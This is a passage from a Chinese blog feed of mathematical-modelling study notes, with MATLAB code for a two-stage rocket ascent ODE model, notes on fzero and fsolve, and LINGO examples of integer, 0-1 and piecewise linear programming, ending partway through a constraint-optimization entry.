<span class="hljs-number">3.354931542338962</span>   <span class="hljs-number">4.665631767112639</span><br>   <span class="hljs-number">8.000000000000000</span>   <span class="hljs-number">3.542377769952171</span>   <span class="hljs-number">4.468790794779848</span><br>   <span class="hljs-number">8.100000000000000</span>   <span class="hljs-number">3.747750865739365</span>   <span class="hljs-number">4.281929919898753</span><br>   <span class="hljs-number">8.199999999999999</span>   <span class="hljs-number">3.972287358592226</span>   <span class="hljs-number">4.104642734922401</span><br>   <span class="hljs-number">8.300000000000001</span>   <span class="hljs-number">4.217388158593900</span>   <span class="hljs-number">3.936541934626040</span><br>   <span class="hljs-number">8.399999999999999</span>   <span class="hljs-number">4.484692559397574</span>   <span class="hljs-number">3.777260394101559</span><br>   <span class="hljs-number">8.500000000000000</span>   <span class="hljs-number">4.776078238226527</span>   <span class="hljs-number">3.626451168757456</span><br>   <span class="hljs-number">8.600000000000000</span>   <span class="hljs-number">5.093661255874061</span>   <span class="hljs-number">3.483787494318877</span><br>   <span class="hljs-number">8.699999999999999</span>   <span class="hljs-number">5.439796056703555</span>   <span class="hljs-number">3.348962786827587</span><br>   <span class="hljs-number">8.800000000000001</span>   <span class="hljs-number">5.817075468648450</span>   <span class="hljs-number">3.221690642641979</span><br>   <span class="hljs-number">8.899999999999999</span>   <span class="hljs-number">6.228330703212222</span>   <span class="hljs-number">3.101704838437082</span><br>   <span class="hljs-number">9.000000000000000</span>   <span class="hljs-number">6.676631355468448</span>   <span class="hljs-number">2.988759331204541</span><br>   <span class="hljs-number">9.100000000000000</span>   <span class="hljs-number">7.165285404060722</span>   <span class="hljs-number">2.882628258252642</span><br>   <span class="hljs-number">9.199999999999999</span>   <span class="hljs-number">7.697839211202703</span>   <span class="hljs-number">2.783105937206295</span><br>   <span class="hljs-number">9.300000000000001</span>   <span class="hljs-number">8.278077522678160</span>   <span class="hljs-number">2.690006866007034</span><br>   <span class="hljs-number">9.399999999999999</span>   <span class="hljs-number">8.910023467840816</span>   <span class="hljs-number">2.603165722913034</span><br>   <span class="hljs-number">9.500000000000000</span>   <span class="hljs-number">9.597978929632328</span>   <span class="hljs-number">2.522479626174848</span><br>   <span class="hljs-number">9.600000000000000</span>  <span class="hljs-number">10.346846934533836</span>   <span class="hljs-number">2.447948500050266</span><br>   <span class="hljs-number">9.699999999999999</span>  <span class="hljs-number">11.162039893459859</span>   <span class="hljs-number">2.379385045866726</span><br>   <span class="hljs-number">9.800000000000001</span>  <span class="hljs-number">12.049420139992524</span>   <span class="hljs-number">2.316643469274441</span><br>   <span class="hljs-number">9.899999999999999</span>  <span class="hljs-number">13.015307238019034</span>   <span class="hljs-number">2.259644421438928</span><br>  <span class="hljs-number">10.000000000000000</span>  <span class="hljs-number">14.066477981731850</span>   <span class="hljs-number">2.208374999040992</span><br>  <span class="hljs-number">10.100000000000000</span>  <span class="hljs-number">15.210166395628448</span>   <span class="hljs-number">2.162888744276744</span><br>  <span class="hljs-number">10.199999999999999</span>  <span class="hljs-number">16.454063734511507</span>   <span class="hljs-number">2.123305644857589</span><br>  <span class="hljs-number">10.300000000000001</span>  <span class="hljs-number">17.806318483488852</span>   <span class="hljs-number">2.089812134010228</span><br>  <span class="hljs-number">10.399999999999999</span>  <span class="hljs-number">19.275536357973380</span>   <span class="hljs-number">2.062661090476664</span><br>  <span class="hljs-number">10.500000000000000</span>  <span class="hljs-number">20.870780303683247</span>   <span class="hljs-number">2.042171838514192</span><br>  <span class="hljs-number">10.600000000000000</span>  <span class="hljs-number">22.601570496641628</span>   <span class="hljs-number">2.028730147895408</span><br>  <span class="hljs-number">10.699999999999999</span>  <span class="hljs-number">24.477884343176854</span>   <span class="hljs-number">2.022788233908206</span><br>  <span class="hljs-number">10.800000000000001</span>  <span class="hljs-number">26.510156479922557</span>   <span class="hljs-number">2.024864757355776</span><br>  <span class="hljs-number">10.899999999999999</span>  <span class="hljs-number">28.709278773817164</span>   <span class="hljs-number">2.035544824556605</span><br>  <span class="hljs-number">11.000000000000000</span>  <span class="hljs-number">31.084367983721659</span>   <span class="hljs-number">2.055829025420224</span><br>  <span class="hljs-number">11.100000000000000</span>  <span class="hljs-number">33.641600133885817</span>   <span class="hljs-number">2.087482853795129</span><br>  <span class="hljs-number">11.199999999999999</span>  <span class="hljs-number">36.398209815499314</span>   <span class="hljs-number">2.130849364961110</span><br>  <span class="hljs-number">11.300000000000001</span>  <span class="hljs-number">39.367967703938106</span>   <span class="hljs-number">2.186873814289113</span><br>  <span class="hljs-number">11.400000000000000</span>  <span class="hljs-number">42.559757627422172</span>   <span class="hljs-number">2.257313701026955</span><br>  <span class="hljs-number">11.500000000000000</span>  <span class="hljs-number">45.977576567015859</span>   <span class="hljs-number">2.344738768299329</span><br>  <span class="hljs-number">11.600000000000000</span>  <span class="hljs-number">49.620534656627697</span>   <span class="hljs-number">2.452531003107799</span><br>  <span class="hljs-number">11.699999999999999</span>  <span class="hljs-number">53.482855183010443</span>   <span class="hljs-number">2.584884636330803</span><br>  <span class="hljs-number">11.800000000000001</span>  <span class="hljs-number">57.553874585761008</span>   <span class="hljs-number">2.746806142723651</span><br>  <span class="hljs-number">11.900000000000000</span>  <span class="hljs-number">61.818042457320516</span>   <span class="hljs-number">2.944114240918524</span><br>  <span class="hljs-number">12.000000000000000</span>  <span class="hljs-number">66.254921542974230</span>   <span class="hljs-number">3.183439893424474</span><br>  <span class="hljs-number">12.100000000000000</span>  <span class="hljs-number">70.842835987138443</span>   <span class="hljs-number">3.469191596026587</span><br>  <span class="hljs-number">12.199999999999999</span>  <span class="hljs-number">75.522162277682469</span>   <span class="hljs-number">3.812925452239469</span><br>  <span class="hljs-number">12.300000000000001</span>  <span class="hljs-number">80.190042341363892</span>   <span class="hljs-number">4.234758224058336</span><br>  <span class="hljs-number">12.400000000000000</span>  <span class="hljs-number">84.721311371072218</span>   <span class="hljs-number">4.754536876029922</span><br>  <span class="hljs-number">12.500000000000000</span>  <span class="hljs-number">88.968565157515215</span>   <span class="hljs-number">5.391807215404708</span><br>  <span class="hljs-number">12.600000000000000</span>  <span class="hljs-number">92.762160089218654</span>   <span class="hljs-number">6.165813892136889</span><br>  <span class="hljs-number">12.699999999999999</span>  <span class="hljs-number">95.910213152526353</span>   <span class="hljs-number">7.095500398884376</span><br>  <span class="hljs-number">12.800000000000001</span>  <span class="hljs-number">98.198601931600223</span>   <span class="hljs-number">8.199509071008816</span><br>  <span class="hljs-number">12.900000000000000</span>  <span class="hljs-number">99.390964608420120</span>   <span class="hljs-number">9.496181086575533</span><br>  <span class="hljs-number">13.000000000000000</span>  <span class="hljs-number">99.228699962784120</span>  <span class="hljs-number">11.003556466353615</span><br>  <span class="hljs-number">13.100000000000000</span>  <span class="hljs-number">97.436046146590030</span>  <span class="hljs-number">12.738369650117397</span><br>  <span class="hljs-number">13.199999999999999</span>  <span class="hljs-number">93.897248393422203</span>  <span class="hljs-number">14.679124234884609</span><br>  <span class="hljs-number">13.300000000000001</span>  <span class="hljs-number">88.688453695875353</span>  <span class="hljs-number">16.763830256803850</span><br>  <span class="hljs-number">13.400000000000000</span>  <span class="hljs-number">82.012934272797054</span>  <span class="hljs-number">18.915104969188761</span><br>  <span class="hljs-number">13.500000000000000</span>  <span class="hljs-number">74.220377956306322</span>  <span class="hljs-number">21.037723489086446</span><br>  <span class="hljs-number">13.600000000000000</span>  <span class="hljs-number">65.797111775025812</span>  <span class="hljs-number">23.020131785390436</span><br>  <span class="hljs-number">13.699999999999999</span>  <span class="hljs-number">57.253976641417438</span>  <span class="hljs-number">24.761724756250914</span><br>  <span class="hljs-number">13.800000000000001</span>  <span class="hljs-number">49.023767724601868</span>  <span class="hljs-number">26.194780217083739</span><br>  <span class="hljs-number">13.900000000000000</span>  <span class="hljs-number">41.434244003664332</span>  <span class="hljs-number">27.279068723563903</span><br>  <span class="hljs-number">14.000000000000000</span>  <span class="hljs-number">34.706174448093314</span>  <span class="hljs-number">28.001620983792861</span><br>  <span class="hljs-number">14.100000000000000</span>  <span class="hljs-number">28.935101031065749</span>  <span class="hljs-number">28.380190468466417</span><br>  <span class="hljs-number">14.199999999999999</span>  <span class="hljs-number">24.065998570034740</span>  <span class="hljs-number">28.461020682665570</span><br>  <span class="hljs-number">14.300000000000001</span>  <span class="hljs-number">20.010527449455722</span>  <span class="hljs-number">28.291941938864412</span><br>  <span class="hljs-number">14.400000000000000</span>  <span class="hljs-number">16.675929778091504</span>  <span class="hljs-number">27.918123986722730</span><br>  <span class="hljs-number">14.500000000000000</span>  <span class="hljs-number">13.965024013772720</span>  <span class="hljs-number">27.382080322488665</span><br>  <span class="hljs-number">14.600000000000000</span>  <span class="hljs-number">11.774235192175343</span>  <span class="hljs-number">26.723934672852753</span><br>  <span class="hljs-number">14.699999999999999</span>   <span class="hljs-number">9.998177418711006</span>  <span class="hljs-number">25.978837203372350</span><br>  <span class="hljs-number">14.800000000000001</span>   <span class="hljs-number">8.554008385420849</span>  <span class="hljs-number">25.173646553167053</span><br>  <span class="hljs-number">14.900000000000000</span>   <span class="hljs-number">7.376179856212027</span>  <span class="hljs-number">24.330003419116061</span><br>  <span class="hljs-number">15.000000000000000</span>   <span class="hljs-number">6.415769580325549</span>  <span class="hljs-number">23.464512074444599</span><br></code></pre></td></tr></table></figure><h2 id="火箭升空模型"><a href="#火箭升空模型" class="headerlink" title="火箭升空模型"></a>火箭升空模型</h2><p>火箭模型复现之后发现与课本数据有少许误差,我认为是 matlab 版本以及计算精度造成的差异<br><img src="https://image.hackerjerry.top/Differential-Equations-17.png#align=left&display=inline&height=766&margin=%5Bobject%20Object%5D&originHeight=766&originWidth=850&size=0&status=done&style=none&width=850"></p><figure class="highlight matlab"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs matlab">ts1 = <span class="hljs-number">0</span>:<span class="hljs-number">0.1</span>:<span class="hljs-number">60</span>;<br>ts2 = <span class="hljs-number">60</span>:<span class="hljs-number">0.1</span>:<span class="hljs-number">71.5</span>;<br>[t1,x1] = ode45(@(t,y)huojian1(t,y),ts1,[<span class="hljs-number">0</span>,<span class="hljs-number">0</span>]);<span class="hljs-comment">%第一阶段</span><br>[t2,x2] = ode45(@(t,y)huojian2(t,y),ts2,[x1(<span class="hljs-built_in">length</span>(x1),<span class="hljs-number">1</span>),x1(<span class="hljs-built_in">length</span>(x1),<span class="hljs-number">2</span>)]);<span class="hljs-comment">%第二阶段</span><br><span class="hljs-built_in">figure</span>(<span class="hljs-number">1</span>);<br><span class="hljs-built_in">plot</span>(t1,x1(:,<span class="hljs-number">1</span>),t2,x2(:,<span class="hljs-number">1</span>));<span class="hljs-comment">%速度图</span><br><span class="hljs-comment">%[t2,x2] = ode45(@huojian2,t2,[0 0]);</span><br><span class="hljs-built_in">figure</span>(<span class="hljs-number">2</span>);<br><span class="hljs-comment">%画高度图</span><br><span class="hljs-built_in">plot</span>(t1,x1(:,<span class="hljs-number">2</span>),t2,x2(:,<span class="hljs-number">2</span>));<br><span class="hljs-comment">%画加速度图</span><br>a1 =diff(x1(:,<span class="hljs-number">1</span>));<br>s1 = <span class="hljs-built_in">linspace</span>(<span class="hljs-number">0</span>,<span class="hljs-number">60</span>,<span class="hljs-number">600</span>)&#x27;;<span class="hljs-comment">%由于前向差分的缘故数据点与横坐标差了1,因此做一个数据拟合</span><br>s2 = <span class="hljs-built_in">linspace</span>(<span class="hljs-number">60</span>,<span class="hljs-number">71.5</span>,<span class="hljs-number">115</span>)&#x27;;<br>a11 = spline(s1,a1,t1);<br>a2 = diff(x2(:,<span class="hljs-number">1</span>));<br>a22 = spline(s2,a2,t2);<br><span class="hljs-built_in">figure</span>(<span class="hljs-number">3</span>);<br><span class="hljs-built_in">plot</span>(t1,a11,t2,a22);grid on;<br>两阶段微分方程组<br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">dx</span> = <span class="hljs-title">huojian1</span><span class="hljs-params">(t,x)</span></span><br><span class="hljs-comment">%阶段一</span><br>M = <span class="hljs-number">1400</span>;m = <span class="hljs-number">18</span>;F = <span class="hljs-number">32000</span>;k = <span class="hljs-number">0.4</span>;g = <span class="hljs-number">9.8</span>;<br>dx = [(F-k*x(<span class="hljs-number">1</span>,<span class="hljs-number">1</span>)*x(<span class="hljs-number">1</span>,<span class="hljs-number">1</span>))/(M-m*t)-g;x(<span class="hljs-number">1</span>,<span class="hljs-number">1</span>)];<br><span class="hljs-keyword">end</span><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">dx</span> =<span class="hljs-title">huojian2</span><span class="hljs-params">(t,x)</span></span><br><span class="hljs-comment">%阶段二</span><br>k = <span class="hljs-number">0.4</span>;g = <span class="hljs-number">9.8</span>;M0=<span class="hljs-number">320</span>;<br>dx = [(-k*x(<span class="hljs-number">1</span>)*x(<span class="hljs-number">1</span>))/M0-g;x(<span class="hljs-number">1</span>)];<br><span class="hljs-keyword">end</span><br></code></pre></td></tr></table></figure><p><a href="https://blog.csdn.net/qq_29831163/article/details/89702947">相关 Blog</a><br>参考网址:<a href="https://blog.csdn.net/qq_29831163/article/details/89703911">https://blog.csdn.net/qq_29831163/article/details/89703911</a></p>]]></content>
    
    
    <categories>
      
      <category>数学建模</category>
      
    </categories>
    
    
    <tags>
      
      <tag>微分方程</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Solving-Nonlinear-equations-and-equations</title>
    <link href="/2020/09/10/Solving-Nonlinear-equations-and-equations_new/"/>
    <url>/2020/09/10/Solving-Nonlinear-equations-and-equations_new/</url>
    
    <content type="html"><![CDATA[<a id="more"></a><h1 id="解非线性方程和方程组"><a href="#解非线性方程和方程组" class="headerlink" title="解非线性方程和方程组"></a>解非线性方程和方程组</h1><h2 id="fzero-命令解三次方程"><a href="#fzero-命令解三次方程" class="headerlink" title="fzero 命令解三次方程"></a>fzero 命令解三次方程</h2><h3 id="语法"><a href="#语法" class="headerlink" title="语法"></a>语法</h3><p>语法<code>x = fzero(fun,x0)</code>, starts at x0 and tries to solve the equations fun(x) = 0(尝试求出 fun(x) = 0 的点 x。此解是 fun(x) 变号的位置 ) - fzero 无法求函数（例如 x^2）的根。<br><code>x = fzero(fun,x0,options)</code>使用 options 修改求解过程。</p><blockquote><p>例如 options = optimset(‘PlotFcns’,{@optimplotx,@optimplotfval});<br>Display 显示级别：</p><ul><li>‘off’ 不显示输出。</li></ul></blockquote><blockquote><ul><li>‘iter’ 在每次迭代时显示输出。</li></ul></blockquote><blockquote><ul><li>‘final’ 仅显示最终输出。</li></ul></blockquote><blockquote><ul><li>‘notify’（默认值）仅在函数未收敛时显示输出。</li></ul></blockquote><p><code>x = fzero(problem)</code>对 problem 指定的求根问题求解。<br><code>[x,fval,exitflag,output] = fzero(___)</code>返回详细结构体<br>例如<code>fzero(inline(&#39;x^3-2*x-5&#39;),0)</code></p><h2 id="fsovle-函数"><a href="#fsovle-函数" class="headerlink" title="fsovle 函数"></a>fsovle 函数</h2><h3 id="语法-1"><a href="#语法-1" class="headerlink" title="语法"></a>语法</h3><p><code>x = fsolve(fun,x0)``x = fsolve(fun,x0,options)``x = fsolve(problem)``[x,fval] = fsolve(___)``[x,fval,exitflag,output] = fsolve(___)``[x,fval,exitflag,output,jacobian] = fsolve(___)</code><br>大同小异</p><h3 id="一个简单的例子"><a href="#一个简单的例子" class="headerlink" title="一个简单的例子"></a>一个简单的例子</h3><p><img src="https://image.hackerjerry.top/Solving-Nonlinear-equations-and-equations-1.png#align=left&display=inline&height=675&margin=%5Bobject%20Object%5D&originHeight=675&originWidth=806&size=0&status=done&style=none&width=806"></p>]]></content>
    
    
    <categories>
      
      <category>数学建模</category>
      
    </categories>
    
    
    <tags>
      
      <tag>matlab</tag>
      
      <tag>非线性方程</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Integer-programming</title>
    <link href="/2020/09/10/Integer-programming_new/"/>
    <url>/2020/09/10/Integer-programming_new/</url>
    
    <content type="html"><![CDATA[<a id="more"></a><h1 id="整数规划"><a href="#整数规划" class="headerlink" title="整数规划"></a>整数规划</h1><h2 id="线性规划-LP-问题"><a href="#线性规划-LP-问题" class="headerlink" title="线性规划 LP 问题"></a>线性规划 LP 问题</h2><blockquote><p>各变量可以是小数来逼近最值</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs lingo">model:<br>max 5*x1+8*x2;<br>x1+x2&lt;6;<br>5*x1+9*x2&lt;&#x3D;45;<br>end<br>输出<br> Objective value:             41.25000<br> X1        2.250000            0.000000<br> X2        3.750000            0.000000<br></code></pre></td></tr></table></figure><h2 id="整数规划-IP-松弛问题"><a href="#整数规划-IP-松弛问题" class="headerlink" title="整数规划 IP 松弛问题"></a>整数规划 IP 松弛问题</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs lingo">model:<br>sets:<br>col&#x2F;1,2&#x2F;;<br>hh(col):x;<br>endsets<br>MAX &#x3D; 5*x(1)+8*x(2);<br>x(1)+x(2)&lt;6;<br>5*x(1)+9*x(2)&lt;&#x3D;45;<br>@for(col(j):@gin(x(j)));!这句话是限制变量为整数（gin）;<br>END<br>输出<br>Objective value:                              40.00000<br>Variable           Value        Reduced Cost<br>X( 1)        0.000000           -5.000000<br>X( 2)        5.000000           -8.000000<br></code></pre></td></tr></table></figure><h2 id="动态规划–最短路径"><a href="#动态规划–最短路径" class="headerlink" title="动态规划–最短路径"></a>动态规划–最短路径</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><code class="hljs lingo">model:<br>sets:<br>citles&#x2F;1..9&#x2F;:L;<br>roads(citles,citles)&#x2F;<br>9,6,9,7,9,8<br>6,4,6,5,7,4,7,5,8,4,8,5<br>4,2,4,3,5,2,5,3<br>2,1,3,1&#x2F;:D;<br>endsets<br>data:<br>D&#x3D;<br>6 3 3<br>6 5 8 6 7 4<br>6 7 8 9<br>5 6;<br>enddata<br>L(1)&#x3D;0;<br>@for(citles(i)|i#GT#1:<br>L(i) &#x3D; @min(roads(i,j):D(i,j)+L(j)));<br>end<br>输出<br> Variable           Value<br>    L( 1)        0.000000<br>    L( 2)        5.000000<br>    L( 3)        6.000000<br>    L( 4)        11.00000<br>    L( 5)        13.00000<br>    L( 6)        17.00000<br>    L( 7)        19.00000<br>    L( 8)        17.00000<br>    L( 9)        20.00000<br>D( 9, 6)        6.000000<br>D( 9, 7)        3.000000<br>D( 9, 8)        3.000000<br>D( 6, 4)        6.000000<br>D( 6, 5)        5.000000<br>D( 7, 4)        8.000000<br>D( 7, 5)        6.000000<br>D( 8, 4)        7.000000<br>D( 8, 5)        4.000000<br>D( 4, 2)        6.000000<br>D( 4, 3)        7.000000<br>D( 5, 2)        8.000000<br>D( 5, 3)        9.000000<br>D( 2, 1)        5.000000<br>D( 3, 1)        6.000000<br></code></pre></td></tr></table></figure><ol><li>所有函数均以@开头</li><li>citles 表示从 1~9 组成的集合，属性 L(i)表示最优行驶路线长</li><li>集合循环语句#GT#表示逻辑关系大于</li><li>L(i) = @min(roads(i,j):D(i,j)+L(j)))即为动态规划基本方程</li></ol><h2 id="选课模型–0-1-规划"><a href="#选课模型–0-1-规划" class="headerlink" title="选课模型–0-1 规划"></a>选课模型–0-1 规划</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><code class="hljs lingo">model:<br>sets:<br>Shuliang&#x2F;1..18&#x2F;:m;<br>Xuanke(Shuliang):x;<br>endsets<br>data:<br>m &#x3D; 5,5,4,4,3,3,3,2,3,3,3,2,2,2,2,1,1,1;<br>enddata<br>min&#x3D;@sum(Xuanke(i):x(i));<br>@for(Xuanke(k):@bin(x(k)));<br>@sum(Xuanke(i):m(i)*x(i))&gt;&#x3D;18;<br>@sum(Xuanke(j)|j#ge#9#and#j#le#18:m(j)*x(j))&lt;&#x3D;@sum(Xuanke(i):m(i)*x(i))&#x2F;3;!j大于9小于18，i的范围为1~18<br>@sum(Xuanke(j)|j#ge#9#and#j#le#18:m(j)*x(j))&gt;&#x3D;@sum(Xuanke(i):m(i)*x(i))&#x2F;6;<br>x(1)&gt;&#x3D;x(5);<br>x(2)&gt;&#x3D;x(7);<br>x(8)&gt;&#x3D;x(9);<br>x(6)&gt;&#x3D;x(10);<br>x(4)&gt;&#x3D;x(11);<br>x(5)&gt;&#x3D;x(12);<br>x(7)&gt;&#x3D;x(13);<br>x(6)&gt;&#x3D;x(14);<br>end<br>输出<br>Objective value:                              5.000000<br>X( 1)        1.000000            1.000000<br>X( 2)        1.000000            1.000000<br>X( 3)        0.000000            1.000000<br>X( 4)        1.000000            1.000000<br>X( 5)        0.000000            1.000000<br>X( 6)        0.000000            1.000000<br>X( 7)        0.000000            1.000000<br>X( 8)        0.000000            1.000000<br>X( 9)        0.000000            1.000000<br>X( 10)        0.000000            1.000000<br>X( 11)        1.000000            1.000000<br>X( 12)        0.000000            1.000000<br>X( 13)        0.000000            1.000000<br>X( 14)        0.000000            1.000000<br>X( 15)        1.000000            1.000000<br>X( 16)        0.000000            1.000000<br>X( 17)        0.000000            1.000000<br>X( 18)        0.000000            1.000000<br></code></pre></td></tr></table></figure><p>由此得出选课方案，一共选 5 门，为 x 矩阵中为 1 的变量。<br>这里发现了 Lingo 的一个非常棒的检查代码的功能！<img src="https://cdn.nlark.com/yuque/0/2020/png/1629942/1599728163727-676d1a88-4879-4aef-aa34-4c66cf99f470.png#align=left&display=inline&height=523&margin=%5Bobject%20Object%5D&originHeight=523&originWidth=1014&size=0&status=done&style=none&width=1014">就是模型编译！它可以直接把代码翻译成数学公式，如图<img src="https://cdn.nlark.com/yuque/0/2020/png/1629942/1599728164253-96254c1f-96d1-44bc-a9c1-919c9ef00301.png#align=left&display=inline&height=636&margin=%5Bobject%20Object%5D&originHeight=636&originWidth=795&size=0&status=done&style=none&width=795"> 简直神器！！这样就可以看看翻译成的式子是不是自己想要的从而检查代码哪里写错了！点赞 👍</p><h2 id="连续规划-–石油购买"><a href="#连续规划-–石油购买" class="headerlink" title="连续规划 –石油购买"></a>连续规划 –石油购买</h2><p>这里遇到一种新情况，即分段规划，比如：当购买量不超过 500 吨时，单价 10000 元；当购买量超过 500 吨但不超过 1000 吨，超过的部分 8000 元，当超过 1000 吨但不超过 1500 吨，超过的部分 6000 元。<br>这里有多种方法可以实现。<br><strong>第一种–巧用 if 语句</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs lingo">model:<br>sets:<br>buy&#x2F;1,2,3&#x2F;:r;<br>nums&#x2F;1,2&#x2F;;<br>goods(nums):x;<br>endsets<br>max &#x3D; 4800*x(1)+5600*x(2)-10000*r(1)-8000*r(2)-6000*r(3);<br>0.5*x(1)+0.6*x(2)&lt;&#x3D;500+r(1)+r(2)+r(3);<br>0.5*x(1)+0.4*x(2)&lt;&#x3D;1000;<br>r(1)&lt;&#x3D;500;<br>r(3)&lt;&#x3D;500;<br>r(2)&lt;&#x3D;500;<br>r(2)&#x3D;@if(r(1)#lt#500,0,r(2));!由于@if语句第一个是判断条件，第二个是为真时的值，第三个是为假的值，而这里必须是个数而不能表示成&lt;&#x3D;500，因此让它等于自身;<br>r(3)&#x3D;@if(r(2)#lt#500,0,r(3));<br>end<br></code></pre></td></tr></table></figure><p><strong>第二种–引入 0-1 变量，转换成线性约束</strong><br>这里约定，为第一阶段购买原油吨，为第二阶段，为第三阶段,表示是否购买.<br>核心代码：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs lingo">x1-500*y1&lt;&#x3D;0;<br>x2-500*y2&lt;&#x3D;0;<br>x3-500*y3&lt;&#x3D;0;<br>x1-500*y2&gt;&#x3D;0;<br>x2-500*y3&gt;&#x3D;0;<br>@bin(y1);<br>@bin(y3);<br>@bin(y2);<br>得到方案<br>Variable           Value        Reduced Cost<br>R( 1)        500.0000            0.000000<br>R( 2)        500.0000            0.000000<br>R( 3)        0.000000            6000.000<br>X( 1)        0.000000            2200.000<br>X( 2)        2500.000            0.000000<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>数学建模</category>
      
    </categories>
    
    
    <tags>
      
      <tag>lingo</tag>
      
      <tag>整数规划</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Constraint-Optimization</title>
    <link href="/2020/09/10/Constraint-Optimization_new/"/>
    <url>/2020/09/10/Constraint-Optimization_new/</url>
    
    <content type="html"><![CDATA[<a id="more"></a><h1 id="约束优化"><a href="#约束优化" class="headerlink" title="约束优化"></a>约束优化</h1><p>matlab 有几种命令可以求解</p><ul><li><p><code>linprog</code>求一次线性规划</p></li><li><p><code>quadprog</code>求二次规划问题</p></li></ul><blockquote><p>书上的方法是将二次规划问题改写成极小化标准形式，获得二次型黑塞矩阵（我没看懂），留一个坑<br>黑塞矩阵：是一个多元函数的二阶偏导数构成的方阵，描述了函数的局部曲率。</p></blockquote><p>一些概念重温<br><img src="https://image.hackerjerry.top/Constraint-Optimization-1.png#align=left&display=inline&height=240&margin=%5Bobject%20Object%5D&originHeight=240&originWidth=553&size=0&status=done&style=none&width=553"><br><img src="https://image.hackerjerry.top/Constraint-Optimization-2.png#align=left&display=inline&height=705&margin=%5Bobject%20Object%5D&originHeight=705&originWidth=930&size=0&status=done&style=none&width=930"><br>黑塞矩阵说白了应该就是对每个变量分别求两次偏导得到的对称正定矩阵。<br><img src="https://image.hackerjerry.top/Constraint-Optimization-3.png#align=left&display=inline&height=336&margin=%5Bobject%20Object%5D&originHeight=336&originWidth=734&size=0&status=done&style=none&width=734"></p><h2 id="linprog语法"><a href="#linprog语法" class="headerlink" title="linprog语法"></a><code>linprog</code>语法</h2><p><code>x = linprog(f,A,b)``x = linprog(f,A,b,Aeq,beq)``x = linprog(f,A,b,Aeq,beq,lb,ub)``x = linprog(f,A,b,Aeq,beq,lb,ub,options)``x = 